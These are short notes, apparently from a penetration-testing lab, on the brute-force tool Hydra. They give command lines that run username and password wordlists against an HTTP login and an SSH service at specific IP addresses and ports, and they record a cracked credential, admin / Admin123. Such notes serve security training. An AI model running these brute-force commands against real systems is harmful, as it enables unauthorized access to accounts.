
# Hydra 


hydra syntax to use a wordlist for both username and password and a non default port:

<span style="color:rgb(255, 0, 0)">hydra -L usernames.txt -P passwords.txt 94.237.58.171 -s 32150 http-ge</span><span style="color:rgb(255, 0, 0)">t</span>

to brute force a service like ssh we can use this (using the username satwossh in this case): 

<span style="color:rgb(255, 0, 0)">hydra -l satwossh -P passwords.txt ssh://94.237.63.198 -s 34740</span>  

```bash
hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE [service://server[:PORT][/OPT]]
```

(to log into ssh without default port: ssh satwossh@94.237.63.198 -p 34740)

 found: host: 94.237.58.171   login: admin   password: Admin123